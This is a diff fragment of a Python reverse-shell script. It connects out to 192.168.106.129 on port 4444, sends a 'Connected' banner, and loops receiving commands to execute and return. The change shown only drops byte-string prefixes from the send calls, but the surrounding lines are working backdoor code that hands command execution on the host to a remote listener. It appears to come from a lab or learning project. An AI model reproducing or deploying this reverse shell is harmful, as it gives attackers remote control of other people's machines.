@@ -10,13 +10,13 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(('192.168.106.129',4444))
 
-connection.send(b'\n[+] Connected!!!\n')
+connection.send('\n[+] Connected!!!\n')
 
 while True:
     command = connection.recv(1024)
 
     if command=='exit':
-        connection.send(b'\n[x] Connection closed ...\n')
+        connection.send('\n[x] Connection closed ...\n')
         break
 
     result = execute_system_command(command)
